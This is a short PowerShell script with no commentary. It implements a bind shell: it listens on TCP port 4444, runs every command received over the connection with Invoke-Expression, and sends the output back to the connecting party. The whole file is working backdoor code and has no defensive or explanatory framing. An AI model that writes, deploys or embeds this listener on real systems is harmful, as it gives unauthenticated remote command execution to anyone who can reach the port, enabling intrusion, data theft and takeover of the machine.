$listener = [System.Net.Sockets.TcpListener]4444
$listener.Start()
$client = $listener.AcceptTcpClient()
$stream = $client.GetStream()
$writer = New-Object System.IO.StreamWriter($stream)
$writer.AutoFlush = $true
while ($true) {
   $data = New-Object System.Byte[] 1024
   $bytesRead = $stream.Read($data, 0, $data.Length)
   if ($bytesRead -le 0) { break }
   $command = ([System.Text.Encoding]::ASCII).GetString($data, 0, $bytesRead)
   try {
       $output = Invoke-Expression -Command $command 2>&1 | Out-String
   } catch {
       $output = $_.Exception.Message
   }
   $writer.WriteLine($output)
}
